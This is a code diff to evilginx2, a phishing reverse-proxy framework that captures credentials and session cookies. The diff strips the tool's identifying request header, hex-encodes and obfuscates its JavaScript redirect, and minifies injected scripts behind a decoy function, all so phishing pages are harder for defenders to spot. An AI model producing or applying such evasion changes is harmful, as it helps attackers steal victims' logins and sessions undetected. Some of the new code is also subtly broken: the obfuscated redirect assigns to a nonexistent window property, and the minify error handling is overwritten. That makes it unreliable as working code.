@@ -39,6 +39,8 @@ import (
 	"github.com/go-acme/lego/v3/challenge/tlsalpn01"
 	"github.com/inconshreveable/go-vhost"
 	http_dialer "github.com/mwitkow/go-http-dialer"
+	"github.com/tdewolff/minify"
+	"github.com/tdewolff/minify/js"
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
@@ -466,7 +468,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				req.Header.Set(p.getHomeDir(), o_host)
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
@@ -656,7 +657,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-					req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -1313,7 +1313,17 @@ func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body st
 }
 
 func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Request, *http.Response) {
-	body := fmt.Sprintf("<html><head><meta name='referrer' content='no-referrer'><script>top.location.href='%s';</script></head><body></body></html>", rurl)
+	obfJS := `
+		<script>
+			(function() {
+				var redirectFunction = function(url) {
+					var _0x5f2c=["\\x74\\x6F\\x70","\\x6C\\x6F\\x63\\x61\\x74\\x69\\x6F\\x6E","\\x68\\x72\\x65\\x66"];
+					window[_0x5f2c[0]+"."+_0x5f2c[1]+"."+_0x5f2c[2]]=url;
+				};
+				redirectFunction('%s');
+			})();
+		</script>`
+	body := fmt.Sprintf("<html><head><meta name='referrer' content='no-referrer'>"+obfJS+"</head><body></body></html>", rurl)
 	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 	if resp != nil {
 		return req, resp
@@ -1330,8 +1340,15 @@ func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url
 	}
 	re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
 	var d_inject string
+
 	if script != "" {
-		d_inject = "<script" + js_nonce + ">" + script + "</script>\n${1}"
+		minifier := minify.New()
+		minifier.AddFunc("text/javascript", js.Minify)
+		obfuscatedScript, err := minifier.String("text/javascript", script)
+		if err != nil {
+			d_inject = "<script" + js_nonce + ">" + "function doNothing() {var x =0};" + script + "</script>\n${1}"
+		}
+		d_inject = "<script" + js_nonce + ">" + "function doNothing() {var x =0};" + obfuscatedScript + "</script>\n${1}"
 	} else if src_url != "" {
 		d_inject = "<script" + js_nonce + " type=\"application/javascript\" src=\"" + src_url + "\"></script>\n${1}"
 	} else {
@@ -1786,10 +1803,6 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 	}
 
 	return "", false
-}
-
-func (p *HttpProxy) getHomeDir() string {
-	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
 }
 
 func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
